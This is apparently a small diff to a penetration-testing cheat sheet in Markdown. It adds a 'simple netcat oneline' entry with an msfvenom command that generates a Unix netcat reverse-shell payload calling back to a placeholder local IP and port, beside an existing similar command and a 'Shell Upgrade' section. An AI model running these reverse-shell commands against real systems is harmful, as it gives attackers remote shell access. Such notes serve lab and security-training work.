@@ -6,6 +6,9 @@
 
 `msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.xxx.xxx LPORT=443 -f python`
 
+* simple netcat oneline
+`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888`
+
 # Shell Upgrade
 
 * The bind/reverse shell is not always fully interactive
